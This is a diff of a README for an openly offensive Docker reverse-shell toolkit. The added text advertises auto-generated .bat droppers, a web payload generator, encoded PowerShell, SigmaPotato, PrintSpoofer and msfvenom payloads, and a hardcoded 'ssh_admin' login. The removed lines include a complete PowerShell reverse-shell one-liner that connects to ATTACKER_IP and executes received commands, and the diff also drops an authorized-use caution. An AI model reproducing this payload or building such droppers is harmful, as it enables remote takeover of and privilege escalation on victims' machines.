@@ -6,68 +6,73 @@ This project provides a **simple and modular Bash-based Reverse Shell Docker con
 
 ---
 
-## 📦 Docker Setup
+## ✨ Features
 
-### Build the Docker Container
+- 🧾 Auto-generated `.bat` droppers with runtime IP/Port injection
+- 🌐 Web UI for live payload generation (`payload_generator.html`)
+- ⚙️ CLI-based dynamic reverse shell generator with output log
+- 🔐 HTTPS server using NGINX with self-signed TLS
+- 🧪 Payloads for:
+  - PowerShell (encoded)
+  - SigmaPotato
+  - PrintSpoofer
+  - ncat / socat / msfvenom
+- 📦 Docker Volumes for logs and payloads
+- 🔐 SSH access (user: `ssh_admin`, pass: `ssh_admin`, port: `2222`)
+
+---
+
+## 🚀 Quick Start
+
 ```bash
 docker build -t reverse-shell .
-```
-
-### Run the Container (Interactive Shell)
-```bash
 docker run -it --rm \
   -v $(pwd)/logs:/app/logs \
+  -v $(pwd)/www:/usr/share/nginx/html \
+  -p 443:443 -p 4444:4444 -p 5555:5555 -p 2222:2222 \
   reverse-shell
 ```
 
 ---
 
-## 🔁 Reverse Shell Payloads
+## 🧾 Web Payload Generator
 
-### 💻 PowerShell (on victim)
-```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
+Visit:
+```
+https://<your_ip>/payload_generator.html
 ```
 
-Replace `ATTACKER_IP` and `ATTACKER_PORT` accordingly.
+Enter your IP and Port to dynamically generate:
+- Base64 PowerShell
+- SigmaPotato
+- PrintSpoofer
 
 ---
 
-## 📁 Volumes & Output
+## 📁 CLI Payload Generator
 
-Logs and reverse shell outputs are stored in the `logs/` directory which is bind-mounted from the host:
-```bash
--v $(pwd)/logs:/app/logs
-```
-
----
-
-## 🔐 Best Practices
-
-- Always use this in authorized environments.
-- Run in isolated VM or container networks for safety.
-- Use encrypted channels if handling sensitive payloads (e.g., `socat`, `openssl`).
+After container starts, you'll be prompted to enter IP and Port. This will:
+- Create encoded payloads
+- Save them to `/usr/share/nginx/html/reverse_payloads.txt`
+- Print to screen
 
 ---
 
-## 📥 Output Location
-- All outputs go to `./logs` on the host machine.
+## 🔐 Access
+
+| Service       | Details                        |
+|---------------|--------------------------------|
+| HTTPS         | https://<your_ip> (port 443)   |
+| SSH           | ssh_admin / ssh_admin (port 2222) |
+| Web Generator | `/payload_generator.html`      |
 
 ---
 
-## 🛠️ Example Interactive Prompt
-When you run the container, you'll be prompted to enter the attacker's IP and Port:
-```bash
-Enter Attacker IP:
-Enter Attacker Port:
-```
+## 🛠️ Notes
 
-This spawns a reverse shell using Bash.
-
----
-
-### 🧠 Tip
-You can also modify the reverse shell payload to use `socat`, `openssl`, or other more stealthy options depending on the target.
+- Adjust IP/Port live at runtime via prompts
+- All files hosted from `/usr/share/nginx/html`
+- Logs and payloads saved under `logs/` and `www/` via volume mounts
 
 ---
 
